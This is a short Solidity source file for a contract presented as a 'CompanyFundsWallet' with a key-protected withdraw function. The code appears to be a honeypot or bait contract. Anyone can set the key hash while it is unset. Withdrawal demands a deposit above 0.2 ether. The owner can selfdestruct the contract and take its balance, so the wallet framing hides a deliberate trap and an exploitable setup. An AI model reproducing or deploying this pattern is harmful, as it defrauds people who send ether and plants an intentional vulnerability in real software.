pragma solidity ^0.4.24;

contract CompanyFundsWallet
{
    bytes32 keyHash;
    address owner;
    
    constructor() public {
        owner = msg.sender;
    }
    
    function withdraw(string key) public payable 
    {
        require(msg.sender == tx.origin);
        if(keyHash == keccak256(abi.encodePacked(key))) {
            if(msg.value > 0.2 ether) {
                msg.sender.transfer(address(this).balance);      
            }
        }
    }
 
    function setup(string key) public 
    {
        if (keyHash == 0x0) {
            keyHash = keccak256(abi.encodePacked(key));
        }
    }
    
    function update(bytes32 _keyHash) public 
    {
        if (keyHash == 0x0) {
            keyHash = _keyHash;
        }
    }
    
    function clear() public 
    {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function () public payable {
        
    }
}